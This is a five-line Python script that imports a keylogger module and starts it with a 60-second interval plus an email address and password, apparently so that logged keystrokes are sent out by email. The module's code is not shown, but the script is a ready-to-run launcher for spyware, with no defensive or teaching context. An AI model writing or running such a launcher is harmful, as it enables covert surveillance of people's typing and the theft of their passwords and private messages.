#!/usr/bin/env python
import keylogger
my_keylogger = keylogger.Keylogger(60, "example@gmail.com", "12341234")
# time , email and password are necessary arguments.
my_keylogger.start()
